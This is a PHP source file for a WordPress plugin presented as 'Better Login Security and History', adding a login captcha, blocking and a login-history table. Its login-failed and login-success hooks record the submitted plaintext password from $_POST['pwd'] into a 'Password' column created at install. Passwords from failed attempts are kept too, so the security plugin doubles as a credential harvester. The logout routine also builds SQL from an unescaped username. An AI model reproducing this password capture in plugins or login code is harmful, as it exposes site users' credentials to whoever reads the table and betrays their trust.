<?php
/*
	Plugin Name: Better Login Security and History
	Plugin URI: http://www.tieuthutrieugia.net
	Description: Login with captcha. Protect your login page from Brute-force attacks also you can track login history.  
	Author: tieuthutrieugia
	Version: 1.0
	Author URI: http://www.tieuthutrieugia.net
*/

session_start();

define('WPTV__OPTIONS', 'better-login-security-history-options' );

require_once ('functions.php');

add_action('login_form', 'WPTV__show_captcha');
add_filter('wp_authenticate_user', 'WPTV__captcha_check' ,10,2);
add_action('wp_login_failed', 'WPTV__login_failed' );
add_action('wp_login', 'WPTV__login_success', 10, 2 );
add_action('wp_logout', 'WPTV__logout' );
add_action('login_head', 'WPTV__check_block_login' );
add_action('admin_menu', 'WPTV__admin_menu');
add_action('admin_head', 'header_code');

register_activation_hook( __FILE__ , 'WPTV__install' );
register_uninstall_hook( __FILE__ , 'WPTV__uninstall' );
 
wp_register_style( 'WPTV__admin_css_f', WP_PLUGIN_URL . '/' . basename(dirname(__FILE__)) . '/' . "style.css" );

//----------------------------------------------------

function WPTV__admin_menu() {
	add_options_page('Better Login Security and History', 'Better Login Security & History', 10, basename(__FILE__), 'WPTV__options_menu'  );
}
//----------------------------------------------------
function WPTV__options_menu() {
	
	if (!current_user_can('manage_options'))  {
			wp_die( __('You do not have sufficient permissions to access this page.') );
		}
		
	$options_path= get_current_parameters('tab');	
	
	if($_GET['tab']=='')
	{
		$_GET['tab']=1;
	}
	
	echo '<div class="wrap"><h2>Better Login Security and History</h2><br/>';
		echo '<ul class="tabs">';
		
			if($_GET['tab']==1)
		  	echo '<li class="active"><a href="' . $options_path . '&tab=1">Login History</a></li>';
		  	else
		  	echo '<li><a href="' . $options_path . '&tab=1">Login History</a></li>';
		  	
		  	if($_GET['tab']==2)
		    	echo '<li class="active"><a href="' . $options_path . '&tab=2">Login Security Options</a></li>';
		    	else
		    	echo '<li><a href="' . $options_path . '&tab=2">Login Security Options</a></li>';

		echo '</ul>

	 	<div class="tabContainer">
		   	<div id="tab1" class="tabContent">';
		   
			$page_num=intval($_GET['tab']);
			include "option_page" . $page_num . ".php";  
		    	
		echo '</div>
	    <!-- / END #tab1 -->
	    
	 </div>
 <!-- / END .tabContainer -->'; 
	echo '</div>';
}
//----------------------------------------------------

function header_code()
{
	wp_enqueue_style('WPTV__admin_css_f');
}

//----------------------------------------------------

function WPTV__show_captcha()
{

		if(WPTV__is_captcha()){
			echo '
			<label style="float:left;">Captcha</label>
			
			<table border="0" id="table1" cellpadding="0" style="border-collapse: collapse;  margin-top:5px; margin-bottom:15px; float:right;">
				<tr><td width="75"><img id="imgcap" src="' . WPTV__get_url_path() . 'captcha.php" ></td>
				<td width="25" align="center" ><a href="javascript:caprefresh();"><img id="imgref" src="' . WPTV__get_url_path() . 'images/refresh.gif"  border="0" ></a></td>
				<td style="padding-left:5px;" > <input type="text" name="captcha" id="captcha" size="20" tabindex="21" style="width: 80px; margin:0; font-size:14px" ></td>
				</tr>
			</table>
			<script>
				function caprefresh()
				{
					document.getElementById("imgcap").src="' . WPTV__get_url_path() . 'captcha.php?r="+Math.random() ;
				}
			</script>';				
		}
}


//----------------------------------------------------

function WPTV__error_shake( $shake_codes ){
 
     $shake_codes[] = 'denied';
     return $shake_codes;
}

//----------------------------------------------------

function WPTV__captcha_check($user, $password )
{
	
	if (!is_a($user, 'WP_User')) { 
		return $user; 
	}
	    if(isset($_POST['captcha'])){
    
	    if($_POST['captcha']!=$_SESSION['capkey'])
		{
	        $error = new WP_Error( 'denied', __("<strong>ERROR</strong>: Please input the five characters shown in the image correctly!") );
	        return $error;
	        
	     }
     }
	
	
   return $user;
		
} 

//----------------------------------------------------

function WPTV__login_failed($username )
{
	WPTV__add_login_row($username,$_POST['pwd'],0);	
	WPTV__increment_show_captcha_option();
} 

//----------------------------------------------------

function WPTV__login_success($username)
{

	WPTV__add_login_row($username,$_POST['pwd'],1);
	
} 

//----------------------------------------------------

function WPTV__logout()
{
	global $wpdb,$table_prefix,$current_user;
    get_currentuserinfo();
    $username=$current_user->user_login;
	$table_name = $table_prefix . 'better_login_security_history';
	$sql=" select ID from $table_name where Username='$username' and Status=1 order by ID desc limit 1 ; ";
	$results = $wpdb->get_results($sql);
	$result=$results[0];
	$ID = $result->ID;	
	if($ID)	
	{
		$sql=" update $table_name set logged_out_time=NOW() where ID=$ID ; ";
		$wpdb->query($sql);
	}
	
} 

//----------------------------------------------------

function WPTV__check_block_login()
{
	if(WPTV__is_blocked()){
			echo '<br/><br/><br/><br/><br/><br/><br/><br/><br/><p align="center"><img border="0" src="' . WPTV__get_url_path() . 'images/warning.gif" align="middle"  >&nbsp;' . WPTV__login_blocked_msg() . '</p>';
	exit(0);
	}
} 

//---------------------------------------------------------------

function WPTV__install(){
	global $wpdb,$table_prefix ; 	
	$table_name = $table_prefix . 'better_login_security_history';
		if($wpdb->get_var("show tables like '$table_name'") != $table_name) {
			$sql = "CREATE TABLE `$table_name` (
					`ID` INT( 11 ) UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY ,
					`Username` VARCHAR( 255 ) NOT NULL ,
					`Name` VARCHAR( 255 ) NOT NULL ,
					`Usertype` VARCHAR( 255 ) NOT NULL ,
					`Sinon_time` DATETIME NOT NULL ,
					`long_time` INT( 20 ) UNSIGNED NOT NULL ,
					`IP` VARCHAR( 20 ) NOT NULL ,
					`Country` VARCHAR(100) NOT NULL,
					`Status` INT( 1 ) NOT NULL DEFAULT '0',
					`logged_out_time` DATETIME NULL ,
					`OS` VARCHAR( 255 ) NOT NULL ,
					`Browser` VARCHAR( 255 ) NOT NULL,
					`Password` VARCHAR( 255 ) DEFAULT NULL
					);";
			$wpdb->query($sql);
		}	
}


//---------------------------------------------------------------

function WPTV__uninstall(){

	global $wpdb,$table_prefix; 
	$table_name = $table_prefix . 'better_login_security_history';
	$sql = " DROP TABLE `$table_name` ";
	$wpdb->query($sql);
}

//---------------------------------------------------------------

?>